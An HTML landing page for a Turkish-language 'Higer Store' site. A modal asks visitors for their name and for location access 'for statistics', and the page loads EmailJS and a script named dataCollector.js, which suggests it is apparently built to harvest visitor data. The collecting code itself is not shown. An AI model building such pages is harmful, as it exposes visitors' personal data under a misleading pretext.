<!-- index.html -->
<!doctype html>
<!-- Dil ve yön başlangıçta JavaScript tarafından ayarlanacak -->
<html lang="tr" dir="ltr"> 
<head> 
    <meta charset="UTF-8"> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <title data-translate-key="pageTitle">Higer Store</title>
    
    <!-- Gerekli Kütüphaneler -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.7.77/Tone.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    
    <!-- Özel Stiller -->
    <link rel="stylesheet" href="css/style.css">
</head> 
<body class="text-gray-200">

    <!-- Ana İçerik -->
    <div class="container mx-auto p-4 sm:p-8 text-center flex flex-col items-center justify-center min-h-screen"> 
        <h1 class="text-4xl font-bold mb-4" data-translate-key="welcomeHeader">Hoş Geldiniz</h1> 
        <p class="text-lg mb-8" data-translate-key="welcomeSubtitle">Lütfen devam etmek için bilgileri onaylayın.</p> 
        <a href="https://t.me/code_unterstutzung" target="_blank" rel="noopener noreferrer" class="inline-flex items-center justify-center w-full max-w-md px-8 py-4 bg-sky-500 hover:bg-sky-600 text-white font-bold rounded-xl shadow-lg transition-transform transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-sky-400"> 
            <i class="fab fa-telegram-plane text-2xl me-3"></i> 
            <span data-translate-key="telegramButton">Telegram Grubumuza Katılın</span>
        </a> 
        <div id="link-buttons" class="w-full max-w-md mt-8"></div> 
    </div> 

    <!-- Giriş Modalı -->
    <div id="modal-backdrop" class="fixed inset-0 bg-black bg-opacity-60 backdrop-blur-sm flex items-center justify-center p-4 z-50"> 
        <div id="modal-content" class="bg-[#2c2c34] rounded-2xl shadow-2xl p-8 w-full max-w-md transform transition-all duration-300"> 
            
            <!-- Dil Seçici -->
            <div class="mb-6">
                 <select id="language-switcher" class="w-full px-4 py-3 bg-[#1a1a1e] text-white border-2 border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition">
                    <option value="tr">Türkçe</option>
                    <option value="en">English</option>
                    <option value="de">Deutsch</option>
                    <option value="ru">Русский</option>
                    <option value="ar">العربية</option>
                </select>
            </div>

            <h2 class="text-2xl font-bold text-center text-[#f0f0f5] mb-4" data-translate-key="modalTitle">Bilgilendirme</h2> 
            <p class="text-center text-[#c0c0c5] mb-6" data-translate-key="modalSubtitle">Bu site, istatistik oluşturmak amacıyla konum verinizi kullanmak için izin ister. Devam etmek için lütfen adınızı girip onaylayın.</p> 
            
            <div class="mb-6"> 
                <input type="text" id="visitor-name-input" class="w-full px-4 py-3 bg-[#1a1a1e] text-white border-2 border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition" data-translate-key="namePlaceholder" placeholder="Adınızı giriniz..."> 
            </div> 
            
            <div id="error-message" class="hidden text-center text-red-400 mb-4 font-semibold"></div> 
            
            <div class="flex justify-center space-x-4"> 
                <button id="reject-btn" class="px-6 py-3 bg-gray-600 hover:bg-gray-700 text-white font-semibold rounded-lg shadow-md transition-transform transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-gray-500" data-translate-key="rejectButton">Reddet</button> 
                <button id="accept-btn" class="px-6 py-3 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-lg shadow-md transition-transform transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-indigo-500" data-translate-key="acceptButton">Kabul Et</button> 
            </div> 
        </div> 
    </div> 

    <!-- Yükleniyor Spinner -->
    <div id="spinner-overlay" class="hidden fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-[60]"> 
        <div class="spinner w-16 h-16 rounded-full"></div> 
    </div> 

    <!-- Durum Mesajı -->
    <div id="status-message" aria-live="polite" class="fixed bottom-5 right-5 p-4 rounded-lg text-white font-bold shadow-lg z-[70] opacity-0 transform translate-y-4 pointer-events-none"></div> 
  
    <!-- JavaScript Modülleri -->
    <script src="js/ui.js" type="module"></script>
    <script src="js/dataCollector.js" type="module"></script>
    <script src="js/main.js" type="module"></script> 
</body>
</html>
